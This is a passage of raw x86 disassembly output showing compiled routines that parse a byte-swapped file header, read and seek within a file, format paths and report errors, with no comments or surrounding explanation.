  4016af:	8b fd                	mov    %ebp,%edi
  4016b1:	8d 4f 01             	lea    0x1(%edi),%ecx
  4016b4:	8a 07                	mov    (%edi),%al
  4016b6:	47                   	inc    %edi
  4016b7:	84 c0                	test   %al,%al
  4016b9:	75 f9                	jne    0x4016b4
  4016bb:	2b f9                	sub    %ecx,%edi
  4016bd:	8b 4b 14             	mov    0x14(%ebx),%ecx
  4016c0:	3b f1                	cmp    %ecx,%esi
  4016c2:	73 4f                	jae    0x401713
  4016c4:	80 7e 11 6f          	cmpb   $0x6f,0x11(%esi)
  4016c8:	75 15                	jne    0x4016df
  4016ca:	57                   	push   %edi
  4016cb:	8d 46 12             	lea    0x12(%esi),%eax
  4016ce:	55                   	push   %ebp
  4016cf:	50                   	push   %eax
  4016d0:	e8 9b 04 01 00       	call   0x411b70
  4016d5:	83 c4 0c             	add    $0xc,%esp
  4016d8:	85 c0                	test   %eax,%eax
  4016da:	74 15                	je     0x4016f1
  4016dc:	8b 4b 14             	mov    0x14(%ebx),%ecx
  4016df:	03 36                	add    (%esi),%esi
  4016e1:	3b 73 10             	cmp    0x10(%ebx),%esi
  4016e4:	72 20                	jb     0x401706
  4016e6:	3b f1                	cmp    %ecx,%esi
  4016e8:	72 da                	jb     0x4016c4
  4016ea:	5f                   	pop    %edi
  4016eb:	5e                   	pop    %esi
  4016ec:	5d                   	pop    %ebp
  4016ed:	33 c0                	xor    %eax,%eax
  4016ef:	5b                   	pop    %ebx
  4016f0:	c3                   	ret
  4016f1:	8d 46 12             	lea    0x12(%esi),%eax
  4016f4:	03 c7                	add    %edi,%eax
  4016f6:	8d 4e 13             	lea    0x13(%esi),%ecx
  4016f9:	03 cf                	add    %edi,%ecx
  4016fb:	5f                   	pop    %edi
  4016fc:	5e                   	pop    %esi
  4016fd:	80 38 00             	cmpb   $0x0,(%eax)
  401700:	5d                   	pop    %ebp
  401701:	0f 45 c1             	cmovne %ecx,%eax
  401704:	5b                   	pop    %ebx
  401705:	c3                   	ret
  401706:	68 30 63 42 00       	push   $0x426330
  40170b:	e8 40 04 00 00       	call   0x401b50
  401710:	83 c4 04             	add    $0x4,%esp
  401713:	5f                   	pop    %edi
  401714:	5e                   	pop    %esi
  401715:	5d                   	pop    %ebp
  401716:	33 c0                	xor    %eax,%eax
  401718:	5b                   	pop    %ebx
  401719:	c3                   	ret
  40171a:	cc                   	int3
  40171b:	cc                   	int3
  40171c:	cc                   	int3
  40171d:	cc                   	int3
  40171e:	cc                   	int3
  40171f:	cc                   	int3
  401720:	8b 44 24 08          	mov    0x8(%esp),%eax
  401724:	56                   	push   %esi
  401725:	8b 74 24 08          	mov    0x8(%esp),%esi
  401729:	8b 08                	mov    (%eax),%ecx
  40172b:	03 c8                	add    %eax,%ecx
  40172d:	3b 4e 10             	cmp    0x10(%esi),%ecx
  401730:	73 12                	jae    0x401744
  401732:	68 30 63 42 00       	push   $0x426330
  401737:	e8 14 04 00 00       	call   0x401b50
  40173c:	8b 46 14             	mov    0x14(%esi),%eax
  40173f:	83 c4 04             	add    $0x4,%esp
  401742:	5e                   	pop    %esi
  401743:	c3                   	ret
  401744:	8b c1                	mov    %ecx,%eax
  401746:	5e                   	pop    %esi
  401747:	c3                   	ret
  401748:	cc                   	int3
  401749:	cc                   	int3
  40174a:	cc                   	int3
  40174b:	cc                   	int3
  40174c:	cc                   	int3
  40174d:	cc                   	int3
  40174e:	cc                   	int3
  40174f:	cc                   	int3
  401750:	83 ec 0c             	sub    $0xc,%esp
  401753:	a1 08 40 43 00       	mov    0x434008,%eax
  401758:	33 c4                	xor    %esp,%eax
  40175a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40175e:	53                   	push   %ebx
  40175f:	56                   	push   %esi
  401760:	8b 74 24 18          	mov    0x18(%esp),%esi
  401764:	57                   	push   %edi
  401765:	8b 06                	mov    (%esi),%eax
  401767:	85 c0                	test   %eax,%eax
  401769:	75 17                	jne    0x401782
  40176b:	8d 46 70             	lea    0x70(%esi),%eax
  40176e:	68 50 63 42 00       	push   $0x426350
  401773:	50                   	push   %eax
  401774:	e8 27 14 00 00       	call   0x402ba0
  401779:	83 c4 08             	add    $0x8,%esp
  40177c:	89 06                	mov    %eax,(%esi)
  40177e:	85 c0                	test   %eax,%eax
  401780:	74 5d                	je     0x4017df
  401782:	8b 15 f0 85 42 00    	mov    0x4285f0,%edx
  401788:	8b 0d f4 85 42 00    	mov    0x4285f4,%ecx
  40178e:	89 54 24 0c          	mov    %edx,0xc(%esp)
  401792:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  401796:	0f ac ca 18          	shrd   $0x18,%ecx,%edx
  40179a:	6a 08                	push   $0x8
  40179c:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4017a0:	80 c2 0c             	add    $0xc,%dl
  4017a3:	51                   	push   %ecx
  4017a4:	50                   	push   %eax
  4017a5:	88 54 24 1b          	mov    %dl,0x1b(%esp)
  4017a9:	e8 02 48 00 00       	call   0x405fb0
  4017ae:	8b f8                	mov    %eax,%edi
  4017b0:	8b da                	mov    %edx,%ebx
  4017b2:	8b cf                	mov    %edi,%ecx
  4017b4:	83 c4 0c             	add    $0xc,%esp
  4017b7:	0b cb                	or     %ebx,%ecx
  4017b9:	74 24                	je     0x4017df
  4017bb:	6a 00                	push   $0x0
  4017bd:	53                   	push   %ebx
  4017be:	57                   	push   %edi
  4017bf:	ff 36                	push   (%esi)
  4017c1:	e8 10 bc 00 00       	call   0x40d3d6
  4017c6:	83 c4 10             	add    $0x10,%esp
  4017c9:	85 c0                	test   %eax,%eax
  4017cb:	79 27                	jns    0x4017f4
  4017cd:	68 30 66 42 00       	push   $0x426630
  4017d2:	68 a8 65 42 00       	push   $0x4265a8
  4017d7:	e8 54 03 00 00       	call   0x401b30
  4017dc:	83 c4 08             	add    $0x8,%esp
  4017df:	5f                   	pop    %edi
  4017e0:	5e                   	pop    %esi
  4017e1:	83 c8 ff             	or     $0xffffffff,%eax
  4017e4:	5b                   	pop    %ebx
  4017e5:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4017e9:	33 cc                	xor    %esp,%ecx
  4017eb:	e8 17 80 00 00       	call   0x409807
  4017f0:	83 c4 0c             	add    $0xc,%esp
  4017f3:	c3                   	ret
  4017f4:	ff 36                	push   (%esi)
  4017f6:	8d 46 18             	lea    0x18(%esi),%eax
  4017f9:	6a 01                	push   $0x1
  4017fb:	6a 58                	push   $0x58
  4017fd:	50                   	push   %eax
  4017fe:	e8 af b7 00 00       	call   0x40cfb2
  401803:	83 c4 10             	add    $0x10,%esp
  401806:	83 f8 01             	cmp    $0x1,%eax
  401809:	73 27                	jae    0x401832
  40180b:	68 54 66 42 00       	push   $0x426654
  401810:	68 f4 64 42 00       	push   $0x4264f4
  401815:	e8 16 03 00 00       	call   0x401b30
  40181a:	83 c4 08             	add    $0x8,%esp
  40181d:	83 c8 ff             	or     $0xffffffff,%eax
  401820:	5f                   	pop    %edi
  401821:	5e                   	pop    %esi
  401822:	5b                   	pop    %ebx
  401823:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401827:	33 cc                	xor    %esp,%ecx
  401829:	e8 d9 7f 00 00       	call   0x409807
  40182e:	83 c4 0c             	add    $0xc,%esp
  401831:	c3                   	ret
  401832:	8b 46 24             	mov    0x24(%esi),%eax
  401835:	8b 4e 20             	mov    0x20(%esi),%ecx
  401838:	0f c8                	bswap  %eax
  40183a:	89 46 24             	mov    %eax,0x24(%esi)
  40183d:	8b 46 28             	mov    0x28(%esi),%eax
  401840:	0f c9                	bswap  %ecx
  401842:	2b f9                	sub    %ecx,%edi
  401844:	89 4e 20             	mov    %ecx,0x20(%esi)
  401847:	0f c8                	bswap  %eax
  401849:	83 db 00             	sbb    $0x0,%ebx
  40184c:	89 46 28             	mov    %eax,0x28(%esi)
  40184f:	8b 46 2c             	mov    0x2c(%esi),%eax
  401852:	83 c7 58             	add    $0x58,%edi
  401855:	0f c8                	bswap  %eax
  401857:	83 d3 00             	adc    $0x0,%ebx
  40185a:	89 46 2c             	mov    %eax,0x2c(%esi)
  40185d:	89 7e 08             	mov    %edi,0x8(%esi)
  401860:	89 5e 0c             	mov    %ebx,0xc(%esi)
  401863:	c7 86 74 50 00 00 00 	movl   $0x0,0x5074(%esi)
  40186a:	00 00 00 
  40186d:	a3 bc 4a 43 00       	mov    %eax,0x434abc
  401872:	33 c0                	xor    %eax,%eax
  401874:	8b 4e 24             	mov    0x24(%esi),%ecx
  401877:	03 4e 08             	add    0x8(%esi),%ecx
  40187a:	6a 00                	push   $0x0
  40187c:	13 46 0c             	adc    0xc(%esi),%eax
  40187f:	50                   	push   %eax
  401880:	51                   	push   %ecx
  401881:	ff 36                	push   (%esi)
  401883:	e8 4e bb 00 00       	call   0x40d3d6
  401888:	ff 76 28             	push   0x28(%esi)
  40188b:	e8 d3 02 01 00       	call   0x411b63
  401890:	83 c4 14             	add    $0x14,%esp
  401893:	89 46 10             	mov    %eax,0x10(%esi)
  401896:	85 c0                	test   %eax,%eax
  401898:	75 27                	jne    0x4018c1
  40189a:	68 6c 66 42 00       	push   $0x42666c
  40189f:	68 ec 63 42 00       	push   $0x4263ec
  4018a4:	e8 87 02 00 00       	call   0x401b30
  4018a9:	83 c4 08             	add    $0x8,%esp
  4018ac:	83 c8 ff             	or     $0xffffffff,%eax
  4018af:	5f                   	pop    %edi
  4018b0:	5e                   	pop    %esi
  4018b1:	5b                   	pop    %ebx
  4018b2:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4018b6:	33 cc                	xor    %esp,%ecx
  4018b8:	e8 4a 7f 00 00       	call   0x409807
  4018bd:	83 c4 0c             	add    $0xc,%esp
  4018c0:	c3                   	ret
  4018c1:	ff 36                	push   (%esi)
  4018c3:	6a 01                	push   $0x1
  4018c5:	ff 76 28             	push   0x28(%esi)
  4018c8:	50                   	push   %eax
  4018c9:	e8 e4 b6 00 00       	call   0x40cfb2
  4018ce:	83 c4 10             	add    $0x10,%esp
  4018d1:	83 f8 01             	cmp    $0x1,%eax
  4018d4:	73 0a                	jae    0x4018e0
  4018d6:	68 90 66 42 00       	push   $0x426690
  4018db:	e9 30 ff ff ff       	jmp    0x401810
  4018e0:	8b 46 28             	mov    0x28(%esi),%eax
  4018e3:	03 46 10             	add    0x10(%esi),%eax
  4018e6:	ff 36                	push   (%esi)
  4018e8:	89 46 14             	mov    %eax,0x14(%esi)
  4018eb:	e8 bd b4 00 00       	call   0x40cdad
  4018f0:	83 c4 04             	add    $0x4,%esp
  4018f3:	85 c0                	test   %eax,%eax
  4018f5:	74 22                	je     0x401919
  4018f7:	68 ac 66 42 00       	push   $0x4266ac
  4018fc:	e8 4f 02 00 00       	call   0x401b50
  401901:	83 c4 04             	add    $0x4,%esp
  401904:	83 c8 ff             	or     $0xffffffff,%eax
  401907:	5f                   	pop    %edi
  401908:	5e                   	pop    %esi
  401909:	5b                   	pop    %ebx
  40190a:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40190e:	33 cc                	xor    %esp,%ecx
  401910:	e8 f2 7e 00 00       	call   0x409807
  401915:	83 c4 0c             	add    $0xc,%esp
  401918:	c3                   	ret
  401919:	8b 46 10             	mov    0x10(%esi),%eax
  40191c:	3b 46 14             	cmp    0x14(%esi),%eax
  40191f:	73 39                	jae    0x40195a
  401921:	8b 48 04             	mov    0x4(%eax),%ecx
  401924:	8b 10                	mov    (%eax),%edx
  401926:	0f c9                	bswap  %ecx
  401928:	89 48 04             	mov    %ecx,0x4(%eax)
  40192b:	8b 48 08             	mov    0x8(%eax),%ecx
  40192e:	0f c9                	bswap  %ecx
  401930:	89 48 08             	mov    %ecx,0x8(%eax)
  401933:	8b 48 0c             	mov    0xc(%eax),%ecx
  401936:	0f ca                	bswap  %edx
  401938:	0f c9                	bswap  %ecx
  40193a:	89 10                	mov    %edx,(%eax)
  40193c:	89 48 0c             	mov    %ecx,0xc(%eax)
  40193f:	03 c2                	add    %edx,%eax
  401941:	3b 46 10             	cmp    0x10(%esi),%eax
  401944:	72 07                	jb     0x40194d
  401946:	3b 46 14             	cmp    0x14(%esi),%eax
  401949:	72 d6                	jb     0x401921
  40194b:	eb 0d                	jmp    0x40195a
  40194d:	68 30 63 42 00       	push   $0x426330
  401952:	e8 f9 01 00 00       	call   0x401b50
  401957:	83 c4 04             	add    $0x4,%esp
  40195a:	56                   	push   %esi
  40195b:	e8 20 f9 ff ff       	call   0x401280
  401960:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401964:	83 c4 04             	add    $0x4,%esp
  401967:	33 c0                	xor    %eax,%eax
  401969:	5f                   	pop    %edi
  40196a:	5e                   	pop    %esi
  40196b:	5b                   	pop    %ebx
  40196c:	33 cc                	xor    %esp,%ecx
  40196e:	e8 94 7e 00 00       	call   0x409807
  401973:	83 c4 0c             	add    $0xc,%esp
  401976:	c3                   	ret
  401977:	cc                   	int3
  401978:	cc                   	int3
  401979:	cc                   	int3
  40197a:	cc                   	int3
  40197b:	cc                   	int3
  40197c:	cc                   	int3
  40197d:	cc                   	int3
  40197e:	cc                   	int3
  40197f:	cc                   	int3
  401980:	57                   	push   %edi
  401981:	ff 74 24 0c          	push   0xc(%esp)
  401985:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  401989:	68 bc 66 42 00       	push   $0x4266bc
  40198e:	68 00 10 00 00       	push   $0x1000
  401993:	8d 47 70             	lea    0x70(%edi),%eax
  401996:	50                   	push   %eax
  401997:	e8 04 01 00 00       	call   0x401aa0
  40199c:	83 c4 10             	add    $0x10,%esp
  40199f:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4019a4:	7d 7c                	jge    0x401a22
  4019a6:	ff 74 24 10          	push   0x10(%esp)
  4019aa:	8d 87 70 10 00 00    	lea    0x1070(%edi),%eax
  4019b0:	68 bc 66 42 00       	push   $0x4266bc
  4019b5:	68 00 10 00 00       	push   $0x1000
  4019ba:	50                   	push   %eax
  4019bb:	e8 e0 00 00 00       	call   0x401aa0
  4019c0:	83 c4 10             	add    $0x10,%esp
  4019c3:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4019c8:	7d 58                	jge    0x401a22
  4019ca:	56                   	push   %esi
  4019cb:	ff 74 24 10          	push   0x10(%esp)
  4019cf:	8d b7 70 20 00 00    	lea    0x2070(%edi),%esi
  4019d5:	56                   	push   %esi
  4019d6:	e8 35 10 00 00       	call   0x402a10
  4019db:	83 c4 08             	add    $0x8,%esp
  4019de:	c7 87 70 50 00 00 00 	movl   $0x0,0x5070(%edi)
  4019e5:	00 00 00 
  4019e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  4019ef:	00 
  4019f0:	8a 06                	mov    (%esi),%al
  4019f2:	8d 76 01             	lea    0x1(%esi),%esi
  4019f5:	88 86 ff 1f 00 00    	mov    %al,0x1fff(%esi)
  4019fb:	84 c0                	test   %al,%al
  4019fd:	75 f1                	jne    0x4019f0
  4019ff:	5e                   	pop    %esi
  401a00:	57                   	push   %edi
  401a01:	e8 4a fd ff ff       	call   0x401750
  401a06:	83 c4 04             	add    $0x4,%esp
  401a09:	85 c0                	test   %eax,%eax
  401a0b:	74 19                	je     0x401a26
  401a0d:	8b 07                	mov    (%edi),%eax
  401a0f:	85 c0                	test   %eax,%eax
  401a11:	74 0f                	je     0x401a22
  401a13:	50                   	push   %eax
  401a14:	e8 38 b3 00 00       	call   0x40cd51
  401a19:	83 c4 04             	add    $0x4,%esp
  401a1c:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  401a22:	33 c0                	xor    %eax,%eax
  401a24:	5f                   	pop    %edi
  401a25:	c3                   	ret
  401a26:	b8 01 00 00 00       	mov    $0x1,%eax
  401a2b:	5f                   	pop    %edi
  401a2c:	c3                   	ret
  401a2d:	cc                   	int3
  401a2e:	cc                   	int3
  401a2f:	cc                   	int3
  401a30:	56                   	push   %esi
  401a31:	8b 74 24 08          	mov    0x8(%esp),%esi
  401a35:	85 f6                	test   %esi,%esi
  401a37:	74 2e                	je     0x401a67
  401a39:	8b 46 10             	mov    0x10(%esi),%eax
  401a3c:	85 c0                	test   %eax,%eax
  401a3e:	74 09                	je     0x401a49
  401a40:	50                   	push   %eax
  401a41:	e8 02 01 01 00       	call   0x411b48
  401a46:	83 c4 04             	add    $0x4,%esp
  401a49:	8b 06                	mov    (%esi),%eax
  401a4b:	85 c0                	test   %eax,%eax
  401a4d:	74 0f                	je     0x401a5e
  401a4f:	50                   	push   %eax
  401a50:	e8 fc b2 00 00       	call   0x40cd51
  401a55:	83 c4 04             	add    $0x4,%esp
  401a58:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  401a5e:	56                   	push   %esi
  401a5f:	e8 e4 00 01 00       	call   0x411b48
  401a64:	83 c4 04             	add    $0x4,%esp
  401a67:	5e                   	pop    %esi
  401a68:	c3                   	ret
  401a69:	cc                   	int3
  401a6a:	cc                   	int3
  401a6b:	cc                   	int3
  401a6c:	cc                   	int3
  401a6d:	cc                   	int3
  401a6e:	cc                   	int3
  401a6f:	cc                   	int3
  401a70:	56                   	push   %esi
  401a71:	68 80 50 00 00       	push   $0x5080
  401a76:	6a 01                	push   $0x1
  401a78:	e8 c0 00 01 00       	call   0x411b3d
  401a7d:	8b f0                	mov    %eax,%esi
  401a7f:	83 c4 08             	add    $0x8,%esp
  401a82:	85 f6                	test   %esi,%esi
  401a84:	75 14                	jne    0x401a9a
  401a86:	68 c0 66 42 00       	push   $0x4266c0
  401a8b:	68 ec 66 42 00       	push   $0x4266ec
  401a90:	e8 9b 00 00 00       	call   0x401b30
  401a95:	83 c4 08             	add    $0x8,%esp
  401a98:	8b c6                	mov    %esi,%eax
  401a9a:	5e                   	pop    %esi
  401a9b:	c3                   	ret
  401a9c:	cc                   	int3
  401a9d:	cc                   	int3
  401a9e:	cc                   	int3
  401a9f:	cc                   	int3
  401aa0:	8d 44 24 10          	lea    0x10(%esp),%eax
  401aa4:	50                   	push   %eax
  401aa5:	6a 00                	push   $0x0
  401aa7:	ff 74 24 14          	push   0x14(%esp)
  401aab:	ff 74 24 14          	push   0x14(%esp)
  401aaf:	ff 74 24 14          	push   0x14(%esp)
  401ab3:	e8 78 f5 ff ff       	call   0x401030
  401ab8:	8b 08                	mov    (%eax),%ecx
  401aba:	ff 70 04             	push   0x4(%eax)
  401abd:	83 c9 02             	or     $0x2,%ecx
  401ac0:	51                   	push   %ecx
  401ac1:	e8 f5 ff 00 00       	call   0x411abb
  401ac6:	83 c9 ff             	or     $0xffffffff,%ecx
  401ac9:	83 c4 1c             	add    $0x1c,%esp
  401acc:	85 c0                	test   %eax,%eax
  401ace:	0f 48 c1             	cmovs  %ecx,%eax
  401ad1:	c3                   	ret
  401ad2:	cc                   	int3
  401ad3:	cc                   	int3
  401ad4:	cc                   	int3
  401ad5:	cc                   	int3
  401ad6:	cc                   	int3
  401ad7:	cc                   	int3
  401ad8:	cc                   	int3
  401ad9:	cc                   	int3
  401ada:	cc                   	int3
  401adb:	cc                   	int3
  401adc:	cc                   	int3
  401add:	cc                   	int3
  401ade:	cc                   	int3
  401adf:	cc                   	int3
  401ae0:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401ae4:	50                   	push   %eax
  401ae5:	6a 00                	push   $0x0
  401ae7:	ff 74 24 10          	push   0x10(%esp)
  401aeb:	ff 74 24 10          	push   0x10(%esp)
  401aef:	e8 3c f5 ff ff       	call   0x401030
  401af4:	ff 70 04             	push   0x4(%eax)
  401af7:	ff 30                	push   (%eax)
  401af9:	e8 19 ff 00 00       	call   0x411a17
  401afe:	83 c4 18             	add    $0x18,%esp
  401b01:	c3                   	ret
  401b02:	cc                   	int3
  401b03:	cc                   	int3
  401b04:	cc                   	int3
  401b05:	cc                   	int3
  401b06:	cc                   	int3
  401b07:	cc                   	int3
  401b08:	cc                   	int3
  401b09:	cc                   	int3
  401b0a:	cc                   	int3
  401b0b:	cc                   	int3
  401b0c:	cc                   	int3
  401b0d:	cc                   	int3
  401b0e:	cc                   	int3
  401b0f:	cc                   	int3
  401b10:	8d 44 24 08          	lea    0x8(%esp),%eax
  401b14:	50                   	push   %eax
  401b15:	ff 74 24 08          	push   0x8(%esp)
  401b19:	e8 92 00 00 00       	call   0x401bb0
  401b1e:	83 c4 08             	add    $0x8,%esp
  401b21:	c3                   	ret
  401b22:	cc                   	int3
  401b23:	cc                   	int3
  401b24:	cc                   	int3
  401b25:	cc                   	int3
  401b26:	cc                   	int3
  401b27:	cc                   	int3
  401b28:	cc                   	int3
  401b29:	cc                   	int3
  401b2a:	cc                   	int3
  401b2b:	cc                   	int3
  401b2c:	cc                   	int3
  401b2d:	cc                   	int3
  401b2e:	cc                   	int3
  401b2f:	cc                   	int3
  401b30:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401b34:	50                   	push   %eax
  401b35:	ff 74 24 0c          	push   0xc(%esp)
  401b39:	e8 72 00 00 00       	call   0x401bb0
  401b3e:	ff 74 24 0c          	push   0xc(%esp)
  401b42:	e8 09 03 01 00       	call   0x411e50
  401b47:	83 c4 0c             	add    $0xc,%esp
  401b4a:	c3                   	ret
  401b4b:	cc                   	int3
  401b4c:	cc                   	int3
  401b4d:	cc                   	int3
  401b4e:	cc                   	int3
  401b4f:	cc                   	int3
  401b50:	e8 c6 48 01 00       	call   0x41641b
  401b55:	50                   	push   %eax
  401b56:	68 f4 66 42 00       	push   $0x4266f4
  401b5b:	6a 02                	push   $0x2
  401b5d:	e8 56 01 01 00       	call   0x411cb8
  401b62:	83 c4 04             	add    $0x4,%esp
  401b65:	50                   	push   %eax
  401b66:	e8 75 ff ff ff       	call   0x401ae0
  401b6b:	8d 44 24 14          	lea    0x14(%esp),%eax
  401b6f:	50                   	push   %eax
  401b70:	ff 74 24 14          	push   0x14(%esp)
  401b74:	e8 37 00 00 00       	call   0x401bb0
  401b79:	83 c4 14             	add    $0x14,%esp
  401b7c:	c3                   	ret
  401b7d:	cc                   	int3
  401b7e:	cc                   	int3
  401b7f:	cc                   	int3
  401b80:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401b84:	50                   	push   %eax
  401b85:	ff 74 24 0c          	push   0xc(%esp)
  401b89:	e8 22 00 00 00       	call   0x401bb0
  401b8e:	83 c4 08             	add    $0x8,%esp
  401b91:	ff 15 7c 60 42 00    	call   *0x42607c
  401b97:	50                   	push   %eax
  401b98:	e8 53 47 00 00       	call   0x4062f0
  401b9d:	50                   	push   %eax
  401b9e:	ff 74 24 0c          	push   0xc(%esp)
  401ba2:	68 fc 66 42 00       	push   $0x4266fc
  401ba7:	e8 64 ff ff ff       	call   0x401b10
  401bac:	83 c4 10             	add    $0x10,%esp
  401baf:	c3                   	ret
  401bb0:	b8 04 10 00 00       	mov    $0x1004,%eax
  401bb5:	e8 66 7c 00 00       	call   0x409820
  401bba:	a1 08 40 43 00       	mov    0x434008,%eax
  401bbf:	33 c4                	xor    %esp,%eax
  401bc1:	89 84 24 00 10 00 00 	mov    %eax,0x1000(%esp)
  401bc8:	8b 84 24 0c 10 00 00 	mov    0x100c(%esp),%eax
  401bcf:	8b 8c 24 08 10 00 00 	mov    0x1008(%esp),%ecx
  401bd6:	56                   	push   %esi
  401bd7:	50                   	push   %eax
  401bd8:	6a 00                	push   $0x0
  401bda:	51                   	push   %ecx
  401bdb:	8d 44 24 10          	lea    0x10(%esp),%eax
  401bdf:	68 00 08 00 00       	push   $0x800
  401be4:	50                   	push   %eax
  401be5:	e8 46 f4 ff ff       	call   0x401030
  401bea:	8b 08                	mov    (%eax),%ecx
  401bec:	ff 70 04             	push   0x4(%eax)
  401bef:	83 c9 02             	or     $0x2,%ecx
  401bf2:	51                   	push   %ecx
  401bf3:	e8 c3 fe 00 00       	call   0x411abb
  401bf8:	68 00 08 00 00       	push   $0x800
  401bfd:	8d 44 24 24          	lea    0x24(%esp),%eax
  401c01:	50                   	push   %eax
  401c02:	8d 84 24 28 08 00 00 	lea    0x828(%esp),%eax
  401c09:	50                   	push   %eax
  401c0a:	e8 51 4b 00 00       	call   0x406760
  401c0f:	83 c4 28             	add    $0x28,%esp
  401c12:	8d b4 24 04 08 00 00 	lea    0x804(%esp),%esi
  401c19:	85 c0                	test   %eax,%eax
  401c1b:	75 04                	jne    0x401c21
  401c1d:	8d 74 24 04          	lea    0x4(%esp),%esi
  401c21:	6a 02                	push   $0x2
  401c23:	e8 90 00 01 00       	call   0x411cb8
  401c28:	56                   	push   %esi
  401c29:	68 bc 66 42 00       	push   $0x4266bc
  401c2e:	50                   	push   %eax
  401c2f:	e8 ac fe ff ff       	call   0x401ae0
  401c34:	8b 8c 24 14 10 00 00 	mov    0x1014(%esp),%ecx
  401c3b:	83 c4 10             	add    $0x10,%esp
  401c3e:	5e                   	pop    %esi
  401c3f:	33 cc                	xor    %esp,%ecx
  401c41:	e8 c1 7b 00 00       	call   0x409807
  401c46:	81 c4 04 10 00 00    	add    $0x1004,%esp
  401c4c:	c3                   	ret
  401c4d:	cc                   	int3
  401c4e:	cc                   	int3
  401c4f:	cc                   	int3
  401c50:	b8 04 50 00 00       	mov    $0x5004,%eax
  401c55:	e8 c6 7b 00 00       	call   0x409820
  401c5a:	a1 08 40 43 00       	mov    0x434008,%eax
  401c5f:	33 c4                	xor    %esp,%eax
  401c61:	89 84 24 00 50 00 00 	mov    %eax,0x5000(%esp)
  401c68:	8b 84 24 0c 50 00 00 	mov    0x500c(%esp),%eax
  401c6f:	53                   	push   %ebx
  401c70:	8b 9c 24 0c 50 00 00 	mov    0x500c(%esp),%ebx
  401c77:	56                   	push   %esi
  401c78:	50                   	push   %eax
  401c79:	68 bc 66 42 00       	push   $0x4266bc
  401c7e:	8b 33                	mov    (%ebx),%esi
  401c80:	8d 84 24 10 10 00 00 	lea    0x1010(%esp),%eax
  401c87:	68 00 10 00 00       	push   $0x1000
  401c8c:	50                   	push   %eax
  401c8d:	e8 0e fe ff ff       	call   0x401aa0
  401c92:	83 c4 10             	add    $0x10,%esp
  401c95:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401c9a:	0f 8d dc 03 00 00    	jge    0x40207c
  401ca0:	8d 84 24 08 10 00 00 	lea    0x1008(%esp),%eax
  401ca7:	6a 3a                	push   $0x3a
  401ca9:	50                   	push   %eax
  401caa:	e8 51 8d 00 00       	call   0x40aa00
  401caf:	83 c4 08             	add    $0x8,%esp
  401cb2:	85 c0                	test   %eax,%eax
  401cb4:	0f 84 c2 03 00 00    	je     0x40207c
  401cba:	8d 48 01             	lea    0x1(%eax),%ecx
  401cbd:	c6 00 00             	movb   $0x0,(%eax)
  401cc0:	8d 54 24 08          	lea    0x8(%esp),%edx
  401cc4:	2b d1                	sub    %ecx,%edx
  401cc6:	8a 01                	mov    (%ecx),%al
  401cc8:	8d 49 01             	lea    0x1(%ecx),%ecx
  401ccb:	88 44 0a ff          	mov    %al,-0x1(%edx,%ecx,1)
  401ccf:	84 c0                	test   %al,%al
  401cd1:	75 f3                	jne    0x401cc6
  401cd3:	38 84 24 08 10 00 00 	cmp    %al,0x1008(%esp)
  401cda:	0f 84 9c 03 00 00    	je     0x40207c
  401ce0:	38 44 24 08          	cmp    %al,0x8(%esp)
  401ce4:	0f 84 92 03 00 00    	je     0x40207c
  401cea:	57                   	push   %edi
  401ceb:	8d 84 24 0c 10 00 00 	lea    0x100c(%esp),%eax
  401cf2:	50                   	push   %eax
  401cf3:	8d 84 24 10 40 00 00 	lea    0x4010(%esp),%eax
  401cfa:	50                   	push   %eax
  401cfb:	e8 10 0d 00 00       	call   0x402a10
  401d00:	8d 44 24 14          	lea    0x14(%esp),%eax
  401d04:	50                   	push   %eax
  401d05:	6a 5c                	push   $0x5c
  401d07:	8d 84 24 1c 40 00 00 	lea    0x401c(%esp),%eax
  401d0e:	50                   	push   %eax
  401d0f:	6a 5c                	push   $0x5c
  401d11:	8d be 70 20 00 00    	lea    0x2070(%esi),%edi
  401d17:	57                   	push   %edi
  401d18:	8d 84 24 28 30 00 00 	lea    0x3028(%esp),%eax
  401d1f:	68 40 67 42 00       	push   $0x426740
  401d24:	50                   	push   %eax
  401d25:	e8 76 03 00 00       	call   0x4020a0
  401d2a:	83 c4 24             	add    $0x24,%esp
  401d2d:	85 c0                	test   %eax,%eax
  401d2f:	75 4d                	jne    0x401d7e
  401d31:	56                   	push   %esi
  401d32:	e8 79 39 00 00       	call   0x4056b0
  401d37:	83 c4 04             	add    $0x4,%esp
  401d3a:	83 f8 ff             	cmp    $0xffffffff,%eax
  401d3d:	0f 84 a0 00 00 00    	je     0x401de3
  401d43:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401d47:	50                   	push   %eax
  401d48:	8d 86 70 30 00 00    	lea    0x3070(%esi),%eax
  401d4e:	50                   	push   %eax
  401d4f:	8d 84 24 14 30 00 00 	lea    0x3014(%esp),%eax
  401d56:	50                   	push   %eax
  401d57:	e8 24 38 00 00       	call   0x405580
  401d5c:	83 c4 0c             	add    $0xc,%esp
  401d5f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401d62:	74 7f                	je     0x401de3
  401d64:	5f                   	pop    %edi
  401d65:	5e                   	pop    %esi
  401d66:	33 c0                	xor    %eax,%eax
  401d68:	5b                   	pop    %ebx
  401d69:	8b 8c 24 00 50 00 00 	mov    0x5000(%esp),%ecx
  401d70:	33 cc                	xor    %esp,%ecx
  401d72:	e8 90 7a 00 00       	call   0x409807
  401d77:	81 c4 04 50 00 00    	add    $0x5004,%esp
  401d7d:	c3                   	ret
  401d7e:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401d82:	50                   	push   %eax
  401d83:	6a 5c                	push   $0x5c
  401d85:	8d 84 24 14 40 00 00 	lea    0x4014(%esp),%eax
  401d8c:	50                   	push   %eax
